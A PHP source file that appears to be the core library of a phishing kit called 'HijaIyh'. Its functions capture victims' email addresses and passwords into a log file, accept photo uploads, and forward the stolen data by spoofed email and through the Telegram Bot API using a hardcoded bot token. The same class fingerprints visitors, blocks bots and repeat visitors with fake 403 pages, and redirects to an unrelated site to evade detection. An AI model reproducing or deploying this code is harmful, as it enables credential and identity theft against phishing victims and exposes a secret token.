<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/


Class hicore{

	public function post($name)
	{
		if(empty($_POST[$name]))
		{
			return '-';
		}else{
			return $_POST[$name];
		}
	}

	public function session($name)
	{
		return @$_SESSION[$name];
	}
	public function create_session($data=array())
	{
		$x = '';
		if(is_array($data)){
		foreach($data as $name=>$val)
		{
			$x.= @$_SESSION[''.$name.'']=$val;
		}
		}
		return $x;
	}
  public function empty_session($name)
  {
    if(empty($_SESSION[$name]))
    {
      return true;
    }else{
      return false;
    }
  }
	public function userIP()
	{
       $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'unknown';
    return $ipaddress;
	}
	public function redirect($kmn='?',$delay=0)
	{
		echo "<META HTTP-EQUIV='REFRESH' CONTENT='".$delay.";url=".$kmn."'/>";
		//echo "<script>window.location.href='".$kmn."';</script>";
		//@header('location:'.$kmn);
		exit;
	}
	public function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
	}
  public  function anti_loop()
    {
        $ip = md5($this->userIP());
        if(isset($_SESSION['jml_block_'.$ip]))
        {
            
             $jml = $_SESSION['jml_block_'.$ip];
            $_SESSION['jml_block_'.$ip] +=1;
            if($jml >= 3)
            {
                $this->stats('bot','BLOCKED IP NGELOOP '.$jml);
                $this->stats('anti_loop','BLOCKED IP NGELOOP '.$jml);
                $this->suspend();exit;
            }
        }else{
        $_SESSION['jml_block_'.$ip]+=1;
            
        }
       
    }
	public function getOS() { 
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
	}
  public function is_mobile()
  {
    $platform = $this->getOS();
    $mobile = ['iPad','iPhone','iPod','Android','BlackBerry','Mobile'];
    if(in_array($platform,$mobile))
    {
      return true;
    }else{
      return false;
    }
  }
  public function mobile_link($action)
  {
    if($this->is_mobile())
    {
      if(file_exists(dirname(__DIR__)).'/action/iyh_m.'.$action.'.php'){
      return 'm.'.$action;
      }else{
        return $action;
      }
    }else{
      return $action;
    }
  }
  public function empty_post_array($data=array())
  {
    $e="";
    foreach($data as $name)
    {
      if(empty($_POST[$name]))
      {
        $e .= "true";
      }else{
        $e .= "false";
      }
    }
    if(preg_match("/true/",$e))
    {
      return true;
    }else{
      return false;
    }
  }
	public function parse_hijaiyh($name,$sub)
	{
    $iki = new Iki64;
		$file = dirname(__DIR__).'/config/scama.iyh.json';
		$parse = json_decode($iki->decodefile($file,'HijaIyh_App'),true);

		return $parse[$name][$sub];
	}
    public function getEmpass($email,$password)
    {
        $save = dirname(__DIR__).'/stats/empass.txt';
        $empass = $this->str_enc($email)."|".$this->str_enc($password)."<br>";
        $this->save($save,$empass);
    }
	public function save($file,$val)
	{
		$fp = fopen($file,'a');
		fwrite($fp,$val);
		fclose($fp);
	}
  public function rand_str($randstr)
{
    $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
}
	public function statsformat($ket)
	{$x = "<pre>";
  $x .= "|<font color=red> ".date('d-m-Y H:i:s')." </font>|<font color=green> ".$this->userIP()." </font>";
  $x .= "|<font color=blue> ".$this->getOS()." </font>|<font color=purple> ".$this->getBrowser()." </font>";
  $x .= "|<font color=orange> ".$this->session('country_')." </font> | <b> ".$ket."</b></pre>";
	/*	$x = [
			   'date' => date('d-m-Y H:i:s'),
			  'ip' => $this->userIP(),
			  'os' => $this->getOS(),
			  'browser' => $this->getBrowser(),
			  'country' => $this->session('country_'),
			  'description' => $ket,
			];*/
		return $x;
	}
	public function stats($name,$val)
	{
		$file = dirname(__DIR__).'/stats/'.$name.'.hijaiyh.html';
		$val = $this->statsformat($val);
		return $this->save($file,$val."\n");
	}
    public function parse_result($type,$data = array())
    {
        $source = dirname(__DIR__).'/assets/html/'.$type.'.html';
        $fsource = file_get_contents($source);
        $rpl1=[];
        $val1=[];
        foreach($data as $rpl=>$val)
        {
            $rpl1[]="{".$rpl."}";
            $val1[]=$val;
        }
        return str_replace($rpl1,$val1,$fsource);
    }
    public  function sendmail($to, $from, $subject, $message) {
     
     require_once(__DIR__.'/SMTP.iyh.php');
     require_once(__DIR__.'/PHPMailer.iyh.php');
     $mail = New PHPMailer;
     $fromMail = "hijaiyh@".$this->rand_str(8).".jakabukan.net";
    $mail->isMail();
    $mail->CharSet =  "UTF-8";  
    $mail->ContentType = "text/html"; 
    $mail->Priority = 1;                                
    $mail->SingleTo = true;
    $mail->From = $fromMail;
    $mail->FromName = $from;                            
    $mail->Subject = '=?UTF-8?B?'.base64_encode(" \xE2\x99\x93 ".$subject).'?=';
    $mail->AltBody = $message;
    $mail->Body = $message;
    $mail->addAddress($to);
  	$mail->send();
  	
 	}

 	public  function sendphoto($to,$from, $subject, $foto = array())
 	{
 	

     require_once(__DIR__.'/SMTP.iyh.php');
     require_once(__DIR__.'/PHPMailer.iyh.php');
     $mail = New PHPMailer;

     $message = "Photo :: $subject <br>";
      $mail->isMail();
    $mail->CharSet =  "UTF-8";  
    $mail->ContentType = "text/html"; 
    $mail->Priority = 1;                                
    $mail->SingleTo = true;
    $mail->From = "hijaiyh@".$this->rand_str(8).".jakabukan.net";
    $mail->FromName = $from;                            
    $mail->Subject = $subject;
    foreach($foto as $photo){
    $mail->AddAttachment($photo);
    //$mail->AddEmbeddedImage($photo);
	}
    $mail->AltBody = $message;
    $mail->Body = $message;
    $mail->addAddress($to);
  	$mail->send();
 	}
  
   public function translate($from = 'en',$to,$text)
    { 
       $from = $from;
    $to = strtolower($to);
    $text = strip_tags(stripslashes($text));
    $param=md5(sha1($text));

    $lang_file = dirname(__DIR__).'/lang/_hijaiyh_'.$to.'.ini';
   
    if(file_exists($lang_file))
    {
      $get_lang = parse_ini_file($lang_file);

      if(array_key_exists($param,$get_lang))
      {
        return $this->str_enc($get_lang[$param]);
      }else{
        return $text;
      }

      }else{
      $get_lang = parse_ini_file(dirname(__DIR__).'/lang/_hijaiyh_en.ini');
       if(array_key_exists($param,$get_lang))
      {
        return $this->str_enc($get_lang[$param]);
      }else{
        return $text;
      }
     /* $get_lang = parse_ini_file('lang_list.ini');
      if(!array_key_exists($param,$get_lang)){

      $save = $param.' = "'.$text.'"'.PHP_EOL;
      file_put_contents('lang_list.ini',$save,FILE_APPEND);
    }
      return $text;*/
    }
  }
    public function str_enc($str) {
    $crypt = array(
      "A" => "065",
      "a" => "097",
      "B" => "066",
      "b" => "098",
      "C" => "067",
      "c" => "099",
      "D" => "068",
      "d" => "100",
      "E" => "069",
      "e" => "101",
      "F" => "070",
      "f" => "102",
      "G" => "071",
      "g" => "103",
      "H" => "072",
      "h" => "104",
      "I" => "073",
      "i" => "105",
      "J" => "074",
      "j" => "106",
      "K" => "075",
      "k" => "107",
      "L" => "076",
      "l" => "108",
      "M" => "077",
      "m" => "109",
      "N" => "078",
      "n" => "110",
      "O" => "079",
      "o" => "111",
      "P" => "080",
      "p" => "112",
      "Q" => "081",
      "q" => "113",
      "R" => "082",
      "r" => "114",
      "S" => "083",
      "s" => "115",
      "T" => "084",
      "t" => "116",
      "U" => "085",
      "u" => "117",
      "V" => "086",
      "v" => "118",
      "W" => "087",
      "w" => "119",
      "X" => "088",
      "x" => "120",
      "Y" => "089",
      "y" => "121",
      "Z" => "090",
      "z" => "122",
      "0" => "048",
      "1" => "049",
      "2" => "050",
      "3" => "051",
      "4" => "052",
      "5" => "053",
      "6" => "054",
      "7" => "055",
      "8" => "056",
      "9" => "057",
      "&" => "038",
      " " => "032",
      "_" => "095",
      "-" => "045",
      "@" => "064",
      "." => "046"
    );
    $encode = "";
    for ($i=0; $i < strlen($str); $i++) {
      $key = substr($str, $i, 1);
      if (array_key_exists($key, $crypt)) {
        $random = rand(1, 3);
     /*   if ($random == '1') {
          $encode = $encode.$key;
        } else if ($random == '3') {
          $encode = $encode.$key;
        } else {*/
          $encode = $encode."&#".$crypt[$key].";";
       /* }*/
      } else {
        $encode = $encode.$key;
      }
    }
    return $encode;
  }
    public function randomuri(){
      $uri = ['https://jamesclear.com/books',
              'https://jamesclear.com/articles',
              'https://jamesclear.com/sleep',
              'https://jamesclear.com'];

      shuffle($uri);
      /*header('location:https://href.li/?'.$uri[0]);*/
      return $uri[0];
    }
    public function suspend()
    {
      @header('HTTP/1.0 403 Forbidden');
   /*   $rand = rand(1,2);
      switch ($rand) {
        case '1':
          exit(@file_get_contents(dirname(__DIR__).'/assets/html/suspend.html'));
          break;
        case '2':
        exit(@file_get_contents(dirname(__DIR__).'/assets/html/tcp.html'));
            break;
        default:
      exit(@file_get_contents(dirname(__DIR__).'/assets/html/suspend.html'));
          break;
      }*/
      exit(file_get_contents(dirname(__DIR__).'/assets/html/403.html'));
      die();
    }
    public function itung($num) {

  if($num>1000) {

        $x = round($num);
        $x_number_format = number_format($x);
        $x_array = explode(',', $x_number_format);
        $x_parts = array('K', 'M', 'B', 'T');
        $x_count_parts = count($x_array) - 1;
        $x_display = $x;
        $x_display = $x_array[0] . ((int) $x_array[1][0] !== 0 ? '.' . $x_array[1][0] : '');
        $x_display .= $x_parts[$x_count_parts - 1];

        return $x_display;

  }

  return $num;
}
  public function count_stats($filename)
  {
    $dir = dirname(__DIR__).'/stats/'.$filename;
    if(file_exists($dir)){
    $c = explode("\n",file_get_contents($dir));
    $c = count($c)-1;
    }else{
      $c=0;
    }
    return $this->itung($c);
  }
  public function emaildetect($email)
  {
    if(filter_var($email,FILTER_VALIDATE_EMAIL))
    {
      if(preg_match("/@gmail/",$email))
      {
        return 'gmail';
      }elseif(preg_match("/@hotmail|@outlook|@live|@msn/",$email))
      {
        return 'microsoft';
      }elseif(preg_match("/@yandex/",$email))
      {
        return 'yandex';
      }elseif(preg_match("/@icloud|@mac|@me/",$email))
      {
        return 'icloud';
      }elseif(preg_match("/@yahoo|@ymail|@rocketmail/",$email))
      {
        return 'yahoo';
      }elseif(preg_match("/@aol/", $email))
      {
        return 'aol';
      }else{
        return false;
      }
    }else{
      return false;
    }
  }
  public function sendtele($chat_id,$param,$photo = false)
  {
    if($chat_id != 0 || $chat_id != null || !empty($chat_id)){

    if($photo == false){
      $param = strip_tags($param);
      $param = "text=".urlencode($param);
    }else{
      $param = "sendPhoto=";
    }
    
    $gett="https://api.telegram.org/bot696021880:AAFhrn_croctCBJlE7mxHz_skTDtdbDBFwQ/".$action."?chat_id=".$chat_id."&".$param;
 // file_put_contents('_.txt',$param);
 // file_put_contents('tempek.txt',$gett);
   return @file_get_contents($gett);
    }
  }
  public function UploadImage($name,$ccname)
  {
    
    $filename = $_FILES[$name]['name'];
    $tmpname  = $_FILES[$name]['tmp_name'];
    $fileext  = strtolower(end(explode(".",$filename)));

    $allowed_ext = array('jpg','png','jpeg');

    if(!in_array($fileext,$allowed_ext))
    {
      return false;
      exit;
    }
    $base_dir = dirname(dirname(__DIR__)).'/HijaIyh_App/upload/';
    $uploaded=$base_dir.$ccname.'.'.$fileext;
    @touch($uploaded);
    if(move_uploaded_file($tmpname,$uploaded))
    {
      @chmod($uploaded,0777);
      return $uploaded;
    }else{
      return false;
    }
    


  }
  public function rm_rf($str) { 
      
    // Check for files 
    if (is_file($str)) { 
          
        // If it is file then remove by 
        // using unlink function 
        return unlink($str); 
    } 
      
    // If it is a directory. 
    elseif (is_dir($str)) { 
          
        // Get the list of the files in this 
        // directory 
        $scan = glob(rtrim($str, '/').'/*'); 
          
        // Loop through the list of files 
        foreach($scan as $index=>$path) { 
              
            // Call recursive function 
            $this->rm_rf($path); 
        } 
          
        // Remove the directory itself 
        return @rmdir($str); 
    } 
} 


}
